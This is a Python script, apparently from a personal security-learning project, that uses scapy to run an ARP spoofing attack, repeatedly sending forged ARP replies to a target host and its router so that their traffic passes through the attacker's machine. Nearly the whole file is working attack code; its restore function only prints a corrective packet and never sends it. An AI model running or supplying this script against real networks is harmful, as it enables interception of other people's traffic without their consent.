#/usr/bin/env python
# Rebuild
from scapy.layers.l2 import ARP, getmacbyip
import scapy.all as scapy
import time
import sys
from utils.arp_spoof_utils import check_port_forwarding
from utils.data import data

check_port_forwarding()

def spoof(target_ip, router_ip):
	target_mac = getmacbyip(target_ip)
	# pkt1 = ARP(op="is-at", psrc=router_ip, hwsrc=router_mac, pdst=victim_ip, hwdst=victim_mac)
	packet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
	scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = getmacbyip(destination_ip)
	source_mac = getmacbyip(source_ip)
	packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
	print(packet.show())
	print(packet.summary())

restore(data["target_ip1"], data["router_ip"])

sent_packets_count = 0
try:
	while True:
		spoof(data["target_ip1"], data["router_ip"])
		spoof(data["router_ip"], data["target_ip1"])
		sent_packets_count = sent_packets_count + 2
		# For Python3 add end="" to the end of the print statement, remove comma
		print("\r[+] Packets sent: " + str(sent_packets_count)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[+] Detected CTRL + C ...... Quiting.")